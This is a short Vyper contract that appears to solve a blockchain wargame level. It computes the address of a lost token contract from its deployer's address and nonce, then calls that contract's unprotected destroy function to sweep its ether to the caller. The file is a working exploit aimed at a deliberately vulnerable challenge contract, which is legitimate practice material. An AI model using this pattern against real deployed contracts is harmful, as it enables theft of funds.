# @version ^0.3.7

interface SimpleTokenInterface:
    def destroy(_to: address): nonpayable

owner: immutable(address)

instance: address

@external
@payable
def __init__(_instance: address):
    owner = msg.sender
    self.instance = _instance
  
@external
def attack():
    assert msg.sender == owner, "!owner"
    token_addr: address = self._compute_address(self.instance)
    SimpleTokenInterface(token_addr).destroy(msg.sender)
    assert token_addr.balance == 0, "!passed"

@internal
def _compute_address(deployer: address) -> address:
    rlp_prefix: bytes1 = 0xd6
    length: bytes1 = 0x94
    nonce: bytes1 = 0x01
    digest: bytes32 = keccak256(
        concat(
            rlp_prefix,
            length,
            convert(deployer, bytes20),
            nonce
        )
    )
    return convert(slice(digest, 12, 20), address)
# inspired by implementation here: https://github.com/pcaversaccio/snekmate/blob/main/src/utils/CreateAddress.vy
